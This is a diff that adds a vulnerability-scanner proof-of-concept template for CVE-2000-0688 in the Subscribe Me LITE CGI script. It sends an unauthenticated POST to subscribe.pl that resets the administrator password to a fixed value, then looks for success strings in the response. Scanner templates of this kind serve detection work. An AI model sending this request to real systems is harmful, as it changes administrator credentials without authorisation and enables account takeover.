@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "通过向 subscribe.pl 发送带有 setpwd 参数的 POST 请求，无需认证即可修改管理员密码。验证目标是否存在认证绕过漏洞。"
+id = "POC-AVE-2000-0538"
+name = "Subscribe Me LITE Admin Password Alteration PoC"
+severity = "high"
+tags = [
+    "cve-2000-0688",
+    "subscribe-me",
+    "cgi",
+]
+vuln_id = [
+    "CVE-2000-0688",
+    "AVE-2000-0538",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/subscribe.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "pwd=avepoc123&pwd2=avepoc123&setpwd=++Set+Password++"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Password has been set",
+    "Password changed",
+    "Account Manager",
+]
